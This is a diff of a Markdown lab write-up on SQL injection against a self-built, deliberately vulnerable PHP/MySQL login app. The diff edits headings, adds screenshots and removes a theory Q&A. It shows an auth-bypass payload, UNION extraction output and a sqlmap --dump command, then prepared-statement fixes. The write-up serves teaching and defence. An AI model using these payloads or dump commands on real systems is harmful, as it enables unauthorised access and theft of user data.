@@ -3,26 +3,28 @@
 
 ---
 
-## 📋 Overview
+## Overview
 
 | Field | Detail |
 |-------|--------|
 | **Target** | Custom PHP 8.5 Login Application (`localhost:8000`) |
 | **Category** | Injection Attacks (OWASP A03:2021) |
-| **Severity** | 🔴 Critical |
+| **Severity** | Critical |
 | **Techniques** | Auth Bypass, UNION-Based Extraction, Automated Dump (SQLMap) |
 | **Tools** | SQLMap 1.9.11, PHP 8.5, MySQL, Kali Linux |
 | **Database** | MySQL — `testdb.users` |
 
 ---
 
-## 🎯 Objective
+## Objective
 
 Build a deliberately vulnerable PHP login application, identify and exploit SQL Injection vulnerabilities, and demonstrate the full attack chain from initial access to full database exfiltration. Contrast the vulnerable implementation against a secured version using prepared statements.
 
 ---
 
-## 🏗️ Lab Setup
+## Lab Setup
+
+<img width="600" height="155" alt="image" src="https://github.com/user-attachments/assets/08529964-5aed-4ced-ae75-4b3561a15ec3" />
 
 ### Database Setup (MySQL)
 ```sql
@@ -54,7 +56,7 @@ Files     : login.html, login.php (vulnerable), loginsecure.php (patched)
 
 ---
 
-## 🔍 Vulnerability Analysis
+## Vulnerability Analysis
 
 ### Vulnerable Code — `login.php`
 
@@ -94,7 +96,7 @@ try {
 
 ---
 
-## 💥 Exploitation
+## Exploitation
 
 ### Attack 1 — Authentication Bypass
 
@@ -117,6 +119,9 @@ SELECT * FROM users WHERE username = 'admin'
 Query: SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'bypass'
 Login berhasil. Selamat datang, admin
 ```
+
+<img width="600" height="387" alt="image" src="https://github.com/user-attachments/assets/db3abe45-cc92-4be5-b827-16786d0532f7" />
+
 
 ---
 
@@ -159,6 +164,9 @@ id | username  | password
 5  | walker    | walk321
 ```
 
+<img width="746" height="377" alt="image" src="https://github.com/user-attachments/assets/f92a4b5d-c084-4915-a7f9-c34d5416d235" />
+
+
 ---
 
 ### Attack 3 — Automated Full Database Dump (SQLMap)
@@ -171,6 +179,8 @@ sqlmap -u "http://192.168.0.14:8000/login.php" \
   --data="username=admin'--&password=dump" \
   --dump
 ```
+
+<img width="746" height="348" alt="image" src="https://github.com/user-attachments/assets/c8710b59-2470-427d-b5b5-2f647e91f253" />
 
 **SQLMap Output:**
 ```
@@ -200,11 +210,16 @@ table: users
 [INFO] table 'testdb.users' dumped to CSV file
 ```
 
+<img width="743" height="572" alt="image" src="https://github.com/user-attachments/assets/21a8eddb-f90e-4a79-89f1-6fb86d07283f" />
+
+
 > Full database schema, table names, column names, and all row data exfiltrated in under 2 minutes.
+
+<img width="745" height="202" alt="image" src="https://github.com/user-attachments/assets/95941c3b-b5f8-42eb-ba23-c7b51ba12f98" />
 
 ---
 
-## 🛠️ Remediation
+## Remediation
 
 ### Fix 1 — Prepared Statements (`loginsecure.php`)
 
@@ -264,7 +279,7 @@ GRANT SELECT ON testdb.users TO 'app_user'@'localhost';
 
 ---
 
-## 📊 Impact Assessment
+## Impact Assessment
 
 | Impact | Description |
 |--------|-------------|
@@ -276,7 +291,7 @@ GRANT SELECT ON testdb.users TO 'app_user'@'localhost';
 
 ---
 
-## 🧠 Lessons Learned
+## Conclusion
 
 1. **Prepared statements are non-negotiable.** String interpolation into SQL queries should never exist in any production or even development code that handles real data.
 2. **Never print debug info to the browser.** Displaying the raw SQL query to the user gave an attacker immediate understanding of the query structure — cutting the exploitation time dramatically.
@@ -286,18 +301,4 @@ GRANT SELECT ON testdb.users TO 'app_user'@'localhost';
 
 ---
 
-## 📚 Theory Questions — Answered
 
-**Q: What is injection in web security, and why is it OWASP Top 10?**  
-Injection is when untrusted user input is interpreted as commands or queries by the system. It ranks in OWASP Top 10 because it is low-complexity for attackers but high-impact — enabling full data exfiltration, auth bypass, and data manipulation with simple payloads.
-
-**Q: SQL Injection vs NoSQL Injection?**  
-- SQL Injection targets relational databases (MySQL, PostgreSQL) — payload: `' OR 1=1--`
-- NoSQL Injection targets document databases (MongoDB) — payload: `{ "$gt": "" }` (matches all where field is greater than empty string)
-
-**Q: What is UNION-based SQL Injection?**  
-Uses the `UNION` SQL operator to append a second `SELECT` to the original query. The attacker matches column count and types, then extracts data from any table in the database and displays it in the application response.
-
----
-
-*Environment: Custom PHP/MySQL lab built and owned by the researcher. Kali Linux used as attacker machine. No external systems targeted.*
